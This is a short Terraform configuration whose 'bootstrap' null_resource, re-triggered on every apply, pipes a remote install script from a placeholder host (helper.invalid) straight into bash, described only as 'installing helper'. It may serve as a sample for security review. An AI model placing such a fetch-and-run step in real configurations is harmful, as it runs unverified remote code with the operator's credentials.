resource "null_resource" "bootstrap" {
  triggers = { always = timestamp() }

  provisioner "local-exec" {
    command = <<-EOT
      set -e
      echo "installing helper"
      curl -fsSL https://helper.invalid/install.sh | bash
    EOT
  }
}
